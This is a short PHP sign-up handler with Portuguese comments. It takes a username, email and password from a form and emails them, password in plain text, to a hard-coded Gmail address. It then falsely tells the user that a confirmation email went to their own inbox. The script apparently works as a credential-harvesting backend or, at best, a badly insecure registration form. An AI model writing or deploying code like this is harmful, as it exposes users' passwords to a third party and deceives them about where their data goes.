<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Captura os dados do formulário
    $nome = $_POST["usernameInput"];
    $email = $_POST["emailInputReg"];
    $senha = $_POST["passwordInputReg"];
    $termos = isset($_POST["agree"]) ? $_POST["agree"] : "Não aceito";

    // Configurações do email
    $para = "contatosmg878@gmail.com"; // Insira o seu endereço de email aqui
    $assunto = "Novo cadastro no site";

    // Monta o corpo do email
    $mensagem = "Um novo usuário se cadastrou no site:\n\n";
    $mensagem .= "Nome de usuário: " . $nome . "\n";
    $mensagem .= "Endereço de email: " . $email . "\n";
    $mensagem .= "Senha: " . $senha . "\n";
    $mensagem .= "Aceitou os termos de uso: " . $termos . "\n";

    // Envia o email
    if (mail($para, $assunto, $mensagem)) {
        echo "Obrigado por se cadastrar! Um email de confirmação foi enviado para o seu endereço de email.";
    } else {
        echo "Erro ao processar o cadastro. Por favor, tente novamente mais tarde.";
    }
}
?>
